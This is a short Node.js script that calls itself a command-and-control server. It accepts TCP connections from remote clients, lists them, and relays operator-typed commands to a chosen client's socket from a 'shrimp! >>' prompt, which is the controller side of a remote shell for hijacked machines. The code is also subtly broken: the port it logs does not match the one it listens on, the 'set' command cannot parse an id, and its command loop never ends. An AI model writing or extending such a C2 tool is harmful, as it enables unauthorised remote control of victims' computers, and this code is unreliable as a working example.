const net = require('net');
const prompt = require('prompt-sync')();

let clients = {};
let currentId;

const server = net.createServer((socket) => {
 const id = Math.random().toString(36).substring(7);
 clients[id] = {socketObject: socket, hostname: socket.remoteAddress};
 console.log('client');

 socket.on('data', (data) => {
 console.log(`Received from client ${id}: ${data}`);
 });

 socket.on('end', () => {
 delete clients[id];
 console.log(`Client ${id} disconnected`);
 });
});

server.listen(8000, () => {
 console.log('Command and Control server listening on port 8080');
});

process.on('SIGINT', () => {
 console.log('\nGracefully shutting down from SIGINT (Ctrl-C)');
 process.exit(0);
});

// Handle user input separately from the server
setInterval(() => {
 let input = prompt("shrimp! >>");
 switch (input) {
  case "set":
    const id = input.split(" ")[1];
    currentId = id;
    while (true){
      const promptForId = prompt(clients[currentId].hostname+'$');
      console.log(promptForId);
      clients[currentId].socketObject.write(promptForId+"\n");

  }
  case "list":
    console.log(clients);

 }
}, 1000);
